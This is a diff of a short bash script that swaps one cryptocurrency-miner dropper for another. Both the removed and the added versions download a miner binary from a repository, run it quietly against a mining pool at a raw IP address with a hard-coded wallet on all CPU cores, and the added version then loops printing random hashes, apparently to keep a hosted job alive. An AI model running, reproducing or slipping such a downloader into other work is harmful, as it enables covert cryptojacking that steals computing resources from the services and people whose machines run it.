@@ -1,4 +1,3 @@
 #!/bin/bash
-wget -O gigi https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1
-chmod 777 gigi
-./gigi --donate-level 1 -o 157.245.1.139:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw -p isuk -a rx/0 -t $(nproc --all)
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw -p .$(shuf -n 1 -i 1-999)-Bismillah -k -a randomx -t $(nproc --all) >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
